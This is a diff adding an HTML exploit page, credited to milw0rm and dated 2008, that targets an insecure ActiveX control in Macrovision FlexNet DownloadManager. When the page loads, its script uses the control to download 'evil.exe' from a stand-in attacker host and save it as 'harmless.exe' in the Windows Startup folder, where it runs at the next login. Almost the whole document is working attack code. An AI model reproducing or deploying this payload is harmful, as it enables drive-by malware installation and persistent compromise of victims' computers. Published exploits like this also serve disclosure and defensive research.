@@ -1,0 +1,35 @@
+<!-- 
+Macrovision FlexNet DownloadManager Insecure Methods Exploit
+Implemented Categories:
+Category: Safe for Scripting
+Written by e.b.
+Tested on Windows XP SP2(fully patched) English, IE6, ISDM.exe version 6.1.100.61372
+-->
+<html>
+ <head>
+  <title>Macrovision FlexNet DownloadManager Insecure Methods Exploit</title>
+  <script language="JavaScript" defer>
+    function Check() {
+     
+	var mJob = obj.CreateJob("SomeJob",0,"{11111111-1111-1111-1111-111111111111}");
+	
+	mJob.AddFile("http://www.evilsite/evil.exe","C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\harmless.exe");
+	mJob.SetPriority(0);
+	mJob.SetNotifyFlags(2);
+	mJob.ScheduleInterval = 2;
+	
+	obj.RunScheduledJobs();
+                
+          
+    } 
+   
+   </script>
+  </head>
+ <body onload="JavaScript: return Check();">
+    <object id="obj" classid="clsid:FCED4482-7CCB-4E6F-86C9-DCB22B52843C" height="0" width="0">
+     Unable to create object
+    </object>
+ </body>
+</html>
+
+# milw0rm.com [2008-01-14]
